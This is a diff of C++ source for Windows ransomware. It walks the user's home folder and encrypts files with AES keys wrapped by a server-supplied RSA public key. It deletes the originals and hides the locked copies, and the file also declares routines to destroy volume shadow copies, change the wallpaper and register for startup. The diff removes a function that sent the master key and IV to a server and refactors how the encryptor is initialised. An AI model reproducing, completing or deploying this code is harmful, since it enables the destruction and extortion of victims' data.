@@ -15,11 +15,10 @@ void test();
 void notify();
 static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
-Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
 void changeHiddenFileState(bool state);
 void destroyVSS();
-static void iterate(const path& parent, const string & mod,
-	const string& exp,
+static void iterate(const path& parent,
+	RsaEncryptor& rsaEncryptor,
 	std::vector<string>& processedPaths);
 Status changeWallPaper(const string&);
 Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
@@ -103,8 +102,9 @@ int encryption_main( bool fromStart) {
 	strID.assign((char*)id, ID_LEN);
 	strID = string_to_hex(strID);
 
+
 	status = getPublicParams(strID, mod, pubKey, fromStart);
-	//status = sendIVAndKeyToServer(masterIV,masterKey,id);
+
 	if(!NT_SUCCESS(status))
 	{
 		goto CLEAN;
@@ -116,40 +116,34 @@ int encryption_main( bool fromStart) {
 	{
 		goto CLEAN;
 	}
+	if (fromStart){
+		pubFile.open(pathToENC, std::ios::out);
+		if (!pubFile.is_open())
+		{
+			std::cout << "Failed to open " + pathToENC + ": " << GetLastError() << std::endl;
+			return -1;
+		}
+		pubFile << "<Modulus>" << mod << "</Modulus><Exponent>" << pubKey << "</Exponent>";
+		pubFile.close();
+		makeFileHidden(pathToENC);
 
-	pubFile.open(pathToENC, std::ios::out);
-	if (!pubFile.is_open())
-	{
-		std::cout << "Failed to open " + pathToENC + ": " << GetLastError() << std::endl;
-		return -1;
+		IDFile.open(pathToID, std::ios::out);
+		if(!IDFile.is_open())
+		{
+			std::cout << "Failed to open " + pathToID + ": " << GetLastError() << std::endl;
+			return -1;
+		}
+		IDFile << NOT_FINISHED_ENCRYPTION;
+		IDFile.write((char*)id, ID_LEN);
+		IDFile.close();
+		makeFileHidden(pathToID);
 	}
-	pubFile << "<Modulus>" << mod << "</Modulus><Exponent>" << pubKey << "</Exponent>";
-	pubFile.close();
-	makeFileHidden(pathToENC);
-
-	IDFile.open(pathToID, std::ios::out);
-	if(!IDFile.is_open())
-	{
-		std::cout << "Failed to open " + pathToID + ": " << GetLastError() << std::endl;
-		return -1;
-	}
-	IDFile << NOT_FINISHED_ENCRYPTION;
-	IDFile.write((char*)id, ID_LEN);
-	IDFile.close();
-	makeFileHidden(pathToID);
-
-
-
-
-	
-
-	
 #ifndef DEBUG
 	string path = get_home();
 #endif
-
-//	encrypt(path, masterIV, masterKey);
-	iterate(path, mod, pubKey, processed);
+	
+	rsaEncryptor.init_Encryptor(mod, pubKey);
+	iterate(path, rsaEncryptor, processed);
 	for(auto& path : processed)
 	{
 		remove(path);
@@ -183,28 +177,6 @@ CLEAN:
 }
 
 /*usefull functions =]] */
-
-Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id)
-{
-	DWORD status;
-	string strID;
-	strID.assign((char*)id, ID_LEN);
-	strID = string_to_hex(strID);
-	string strMasterIV;
-	strMasterIV.assign((char*)masterIV, IV_LEN);
-	strMasterIV = string_to_hex(strMasterIV);
-	string strMasterKey;
-	strMasterKey.assign((char*)masterKey, KEY_LEN);
-	strMasterKey = string_to_hex(strMasterKey);
-	string str = "ID=";
-	str += strID + "&&";
-	str += "IV=" + strMasterIV + "&&";
-	str += "key=" + strMasterKey;
-	status = SendToServer(str);
-
-	
-	return status;
-}
 
 void makeFileHidden(string path)
 {
@@ -275,12 +247,10 @@ void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, si
 	snprintf(paddingSizeCStr, IV_DIGITS_NUM + 1, "%02d", paddingSize);
 	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
 	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
-	ofile.write((char*)keyIV, KEY_LEN + IV_LEN);
+	ofile.write((char*)keyIV, ENCRYPTED_KEY_IV_LEN);
 	ofile.write((char*)cipherText, cipherLen);
-	int size_tot = IV_DIGITS_NUM + KEY_LEN + IV_LEN + cipherLen;
 	makeFileHidden(path + LOCKED_EXTENSION);
 	ofile.close();
-	
 }
 
 DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
@@ -525,8 +495,8 @@ void RegisterProgram()
 	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
 }
 
-static void iterate(const path& parent, const string & mod,
-	const string& exp,
+static void iterate(const path& parent,
+	RsaEncryptor& rsaEncryptor,
 	std::vector<string>& processedPaths)
 {
 	string path;
@@ -540,13 +510,11 @@ static void iterate(const path& parent, const string & mod,
 		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
 			if (is_valid_folder(path))
 			{
-				iterate(path, mod, exp, processedPaths);
+				iterate(path, rsaEncryptor, processedPaths);
 			}
 		}
 		else {
 			if (!do_encrypt(path)) continue;//see TODO 2 rows below
-			RsaEncryptor rsaEncryptor;
-			rsaEncryptor.init_Encryptor(mod, exp);
 			status = encrypt(path, rsaEncryptor);
 			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
 			if(!NT_SUCCESS(status))
